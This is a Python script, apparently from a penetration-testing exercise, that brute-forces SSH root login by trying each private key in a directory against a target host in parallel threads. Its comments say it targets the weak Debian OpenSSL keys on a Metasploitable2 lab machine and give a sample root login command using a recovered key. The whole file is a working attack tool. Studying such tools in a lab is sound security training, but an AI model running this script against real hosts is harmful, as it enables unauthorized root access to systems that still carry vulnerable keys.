# coding=utf-8
# Tested with weak Debian pre-08' keys available on my Github. When attacking Metaspoloitable2 on port 22,
# using SSHAutomatePassword.py will give the authorized_key value which can be grepped against the Debian Key list
# to find the public key and matching private key, saving time over this script.
# ex. ssh -lroot -p22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.140.128 -vvv

import argparse
import os
from threading import *

import pexpect

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(user, host, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        bad_ip = 'No route to host'
        conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile
        login_success = 'Last login:'
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, login_success, bad_ip])
        if ret == 2:
            print('[-] adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] connection Closed By Remote Host')
            Fails += 1
        elif ret == 4:
            print('[+] Success. ' + str(keyfile))
            Stop = True
        elif ret == 5:
            print('[+] Check your IP. ' + str(host))
            os._exit(1)  # too aggressive!?
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser('usage%prog -H ' + '<target host> -u <user> -d <directory>')
    parser.add_argument('tgtHost', type=str)
    parser.add_argument('passkey_path', type=str)

    args = parser.parse_args()
    tgt_host = args.tgtHost
    user = 'root'
    passkey_path = args.passkey_path
    if (tgt_host is None) | (passkey_path is None):
        print(parser.print_help())
        exit(0)

    for filename in os.listdir(passkey_path):
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: ' + 'Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passkey_path, filename)
        print('[-] Testing keyfile ' + str(fullpath))
        t = Thread(target=connect, args=(user, tgt_host, fullpath, True))
        t.start()


if __name__ == '__main__':
    main()
